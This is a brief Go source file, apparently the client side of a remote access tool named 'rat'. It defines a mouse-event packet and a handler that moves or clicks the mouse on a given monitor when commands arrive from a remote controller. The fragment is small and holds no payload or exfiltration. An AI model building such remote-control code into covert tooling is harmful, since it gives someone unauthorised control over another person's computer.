package main

import "rat/common"
import "rat/client/screen"

type MousePacket struct {
	MonitorID   int `receive`
	MouseButton int `receive`
	Type        int `receive`
}

func (packet *MousePacket) Header() common.PacketHeader {
	return common.MouseHeader
}

func (packet *MousePacket) OnReceive() error {
	screen.Mouse(packet.MonitorID, packet.MouseButton, packet.Type)
	return nil
}
